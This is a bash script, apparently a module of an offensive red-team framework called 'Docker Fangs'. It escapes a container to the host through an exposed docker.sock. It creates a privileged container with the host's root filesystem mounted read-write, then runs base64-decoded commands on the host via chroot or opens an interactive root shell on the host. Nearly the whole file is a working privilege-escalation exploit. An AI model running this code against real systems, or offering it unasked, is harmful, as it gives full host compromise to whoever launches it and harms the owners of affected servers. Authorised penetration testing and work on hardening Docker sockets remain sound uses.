#!/usr/bin/env bash
# ============================================================
#                DOCKER FANGS – RED TEAM EDITION
#        Privileged Container Command Execution & Host Escape Via docker.sock
# ============================================================

set -eu

# Colors
RED="\033[1;31m"
GRN="\033[1;32m"
YEL="\033[1;33m"
CYN="\033[1;36m"
RST="\033[0m"

SOCK="/var/run/docker.sock"
CURL="curl -s --unix-socket $SOCK"
TIMEOUT="--max-time 10"
BASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
SOCAT=$BASE_DIR/modules/bin/socat
source $BASE_DIR/themes/theme.sh


echo -e "${RED}☠ DOCKER SOCKET PRIVESC MODULE ☠${RST}"
echo -e "${RED}This exploit leverages docker.sock to gain host-level access.${RST}"
echo -e "${RED}Use utility args to execute, upload, escape, and more.${RST}"

#check reachable socket
check() {
    if curl -s --fail --unix-socket /var/run/docker.sock \
        http://localhost/containers/json >/dev/null 2>&1; then
        
        success "[+] Docker socket reachable"
    else
        error "[-] Docker socket NOT reachable"
        exit 1
    fi
}

console_block() {
    local title="$1"
    local body="$2"

    # Top border
    echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${RESET}"
    
    # Title section
    echo -e "${RED}║${RESET} ${BOLD}${CYAN}🜸  $title  🜸${RESET}"
    echo -e "${RED}╠══════════════════════════════════════════════════════════════╣${RESET}"

    # Body with ninja style padding
    while IFS= read -r line; do
        printf "${RED}║${RESET} %s\n" "$line"
    done <<< "$body"

    # Bottom border + ninja style
    echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${RESET}"
    echo -e "${MAGENTA}${DIM}⚔  Shadow Ops: Container Escape Framework Active  ⚔${RESET}"
}


check_docker_socket() {
    [ -S "$SOCK" ] || { echo -e "${RED}[ERR] No docker socket at $SOCK${RST}"; exit 1; }
}

extract_id() {
    echo "$1" | awk -F'"' '/"Id":/ {print $4; exit}'
}

shortid() { echo "$1" | cut -c1-12; }

api_post() {
    path="$1"
    payload="${2:-}"
    if [ -n "$payload" ]; then
        $CURL $TIMEOUT -H "Content-Type: application/json" -d "$payload" -X POST "http://docker$path"
    else
        $CURL $TIMEOUT -X POST "http://docker$path"
    fi
}

api_get() {
    $CURL $TIMEOUT "http://docker$1"
}

api_delete() {
    $CURL $TIMEOUT -X DELETE "http://docker$1"
}
b64_decode() {
    local b64="$*"
    printf "%s" "$b64" | base64 --decode
}

utility-exec-function() {
    
    command="$*"
    decoded=$(b64_decode "$command")
    #echo -e "${YEL}[*] encoded command to execute: $base64command${RST}"
    echo -e "${YEL}[*] Decoded command to execute: $decoded${RST}"
    
    echo -e "${YEL}[*] Creating privileged container with host mount...${RST}"

    # Create container with host mount
    payload='{
        "Image":"debian:stable-slim",
        "Cmd":["/bin/bash","-c","sleep 3600"],
        "HostConfig":{
            "Binds":["/:/host:rw"],
            "Privileged":true
        }
    }'

    resp=$(api_post "/containers/create" "$payload")
    cid=$(extract_id "$resp")
    
    
    if [ -z "$cid" ]; then
        echo -e "${RED}[ERR] Failed to create container${RST}"
        return 1
    fi

    cid_short=$(shortid "$cid")
    echo -e "${GRN}[+] Container created: $cid_short${RST}"

    # Start container
    api_post "/containers/$cid/start" >/dev/null
    echo -e "${GRN}[+] Container started${RST}"

    # If command provided, execute it on host
    if [ -n "$command" ]; then
        echo -e "${YEL}[*] Executing on host: $command${RST}"
        
        # Escape command for host execution 
        cmd="chroot /host /bin/sh -c 'echo $command'"
        host_cmd=" $cmd | base64 -d | sh"
        CMD_JSON="[\"/bin/sh\", \"-c\", \"$host_cmd\"]"
        payload="{\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":false,\"Cmd\":$CMD_JSON}"
        
        resp=$(api_post "/containers/$cid/exec" "$payload")
        execid=$(extract_id "$resp")

        if [ -z "$execid" ]; then
            echo -e "${RED}[ERR] Failed to create exec instance${RST}"
        else
            echo -e "${GRN}[+] Executing command on HOST...${RST}"
            output=$(api_post "/exec/$execid/start" '{"Detach":false,"Tty":true}')
            console_block "HOST CONSOLE OUTPUT" "$output"
            
            # Get exit code
            inspect=$(api_get "/exec/$execid/json")
            exit_code=$(echo "$inspect" | grep -o '"ExitCode":[0-9]*' | cut -d: -f2)
            
            echo "----------------------------------------"
            if [ "$exit_code" = "0" ]; then
                echo -e "${GRN}[+] Host command completed (exit code: $exit_code)${RST}"
            else
                echo -e "${RED}[!] Host command failed (exit code: $exit_code)${RST}"
            fi
        fi
    else
        # Interactive shell fallback
        echo -e "${YEL}[*] Starting interactive host shell...${RST}"
        echo -e "${YEL}[!] Press Ctrl+D to exit and cleanup${RST}"
        
        payload="{\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"Cmd\":[\"/bin/sh\", \"-c\", \"chroot /host /bin/sh\"]}"
        resp=$(api_post "/containers/$cid/exec" "$payload")
        execid=$(extract_id "$resp")
        
        # Use socat for better TTY if available
        if [ -x "$SOCAT" ]; then
            $SOCAT - EXEC:"$CURL -X POST -H \\\"Content-Type: application/json\\\" -d '{\\\"Detach\\\":false,\\\"Tty\\\":true}' http://docker/exec/$execid/start" 2>/dev/null
        else
            api_post "/exec/$execid/start" '{"Detach":false,"Tty":true}'
        fi
    fi

    # Cleanup
    echo -e "${YEL}[*] Cleaning up container...${RST}"
    api_delete "/containers/$cid?force=true" >/dev/null
    echo -e "${GRN}[+] Cleanup completed${RST}"
}